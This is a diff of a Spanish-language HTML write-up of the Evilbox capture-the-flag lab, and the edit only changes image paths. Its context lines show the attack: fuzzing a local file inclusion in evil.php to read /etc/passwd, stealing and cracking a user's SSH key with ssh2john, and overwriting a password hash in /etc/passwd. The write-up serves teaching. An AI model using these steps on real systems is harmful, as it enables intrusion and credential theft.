@@ -64,7 +64,7 @@ PORT STATE SERVICE
 22/tcp open ssh
 80/tcp open http</pre>
                         <p><i>El puerto 80 tiene la página de Apache por defecto</i></p>
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117182600.png" width="800">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230117182600.png" width="800">
                         <p><i>Uso nikto para ver posibles vulnerabilidades o recursos en la página</i></p>
                         <pre>
 ❯ nikto -h http://192.168.1.19/
@@ -83,8 +83,8 @@ PORT STATE SERVICE
                         </pre>
                         <p><i>Me muestra un "robots.txt" un directorio "/secret/" y un "/icons/README"
 Nada interesante en robots.txt y /secret por ahora</i></p>
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117183648.png">
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117183823.png">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230117183648.png">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230117183823.png">
                         <p><i>Después de hacer fuzzing de subdominios u otras rutas y no encontrar nada, busque por archivos php o txt en el directorio
 /secret/</i></p>
                         <pre>
@@ -108,7 +108,7 @@ Gobuster v3.1.0
 ===============================================================
                         </pre>
                         <p><i>El recurso evil.php existe, pero en la web todavía no muestra nada</i></p>
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117190744.png">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230117190744.png">
                         <p><i>Tiene pinta de ser un Local File Inclusion (LFI), por lo que lanzo otro escaneo para detectar algún parámetro web con el que pueda listar archivos locales de la máquina</i></p>
                         <pre>
 ❯ wfuzz -c --hc=404 --hw=0 -w /opt/SecLists/Miscellaneous/web/html-tags.txt 'http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd' 2>/dev/null
@@ -129,9 +129,9 @@ Filtered Requests: 152
 Requests/sec.: 0
                         </pre>
                         <p><i>'command' parece ser el parámetro para intentar un LFI</i></p>
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117192622.png" width="900">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230117192622.png" width="900">
                         <p><i>Funciona, por lo que ahora podemos probar ver la id_rsa de algún usuario del sistema</i></p>
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230117204123.png">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230117204123.png">
                         <p><i>Vemos la del usuario 'mowree' pero está encriptada. Con ssh2john podemos tratar de sacar la contraseña</i></p>
                         <pre>
 ❯ /usr/share/john/ssh2john.py id_rsa > hash
@@ -175,9 +175,9 @@ Verifying - Password:
 $1$eKwzP0P1$W4PsKYip9JqhXY2BAKMBe0                        
                         </pre>
                         <p><i>Con openssl generamos el hash de la contraseña "password123" y lo cambiamos por la x en /etc/passwd</i></p>
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230118010249.png">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230118010249.png">
                         <hr> 
-                        <img src="/jk/startbootstrap-clean-blog-gh-pages/VH/Evilbox/img/Pasted%20image%2020230118010342.png">
+                        <img src="/VH/Evilbox/img/Pasted%20image%2020230118010342.png">
                     </div>
                 </div>
             </div>
